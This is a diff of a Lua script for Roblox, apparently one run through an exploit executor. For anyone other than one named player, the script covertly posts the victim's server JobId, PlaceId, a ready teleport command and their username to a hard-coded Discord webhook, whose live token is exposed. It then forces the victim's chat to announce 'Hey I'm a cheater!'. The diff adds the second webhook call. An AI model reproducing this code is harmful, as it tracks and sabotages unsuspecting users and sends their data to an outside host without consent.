@@ -12,7 +12,16 @@ if game.Players.LocalPlayer.Name ~= "Sammywammylol502" then
             content = 'JobId = `'..game.JobId..'`\nPlaceId = `'..game.PlaceId..'`\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)```'
         })
     })
-    task.wait(30)
+    task.wait(35)
+	request({
+        Url = "https://discordapp.com/api/webhooks/1506162347054727261/sLurO4YZGRxs5jSWKKmT2noinC89lb-AdmVpPBXrCxxY9QWkwmXJo0H7TtRbV-cL-LpX",
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            username = game.Players.LocalPlayer.Name,
+            content = 'KABOOM'
+        })
+    })
 	--game.CoreGui.RobloxGui:Destroy()
 	game.TextChatService.TextChannels.RBXGeneral:SendAsync('Hey I\'m a cheater!')
 	task.wait(0.5)
